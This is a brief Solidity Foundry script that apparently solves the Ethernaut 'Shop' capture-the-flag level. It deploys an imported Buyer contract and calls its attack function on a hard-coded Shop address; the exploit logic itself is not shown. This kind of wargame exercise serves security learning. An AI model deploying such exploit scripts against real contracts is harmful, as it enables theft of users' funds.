// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {Shop} from "../../src/Ethernaut/Shop.sol";
import {Buyer} from "../../test/Ethernaut/Shop.t.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Shop shop = Shop(0x6c7fEC1AC1A07f0c01f7CCd38B88444B78De427D);
        Buyer buyer = new Buyer();
        buyer.attack(shop);
        vm.stopBroadcast();
    }
}
